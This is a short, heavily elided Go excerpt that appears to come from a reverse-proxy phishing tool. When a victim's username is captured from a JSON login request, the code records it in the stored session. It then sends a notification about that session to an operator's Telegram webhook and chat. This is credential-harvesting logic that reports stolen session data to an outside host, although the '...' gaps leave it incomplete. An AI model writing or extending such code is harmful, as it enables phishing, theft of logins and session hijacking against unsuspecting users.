							...
							if pl.username.tp == "json" {
								...
								if um != nil && len(um) > 1 {
									...
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										...
										if p.cfg.IsTelegramEnabled() && p.cfg.GetTelegramWebhook() != "" && p.cfg.GetTelegramChatId() != "" {
											go func() {
												err := SendSessionNotification(p.db, p.cfg.GetTelegramWebhook(), p.cfg.GetTelegramChatId(), ps.SessionId)
												if err != nil {
													log.Error("telegram notification: %v", err)
												}
											}()
										}
									}
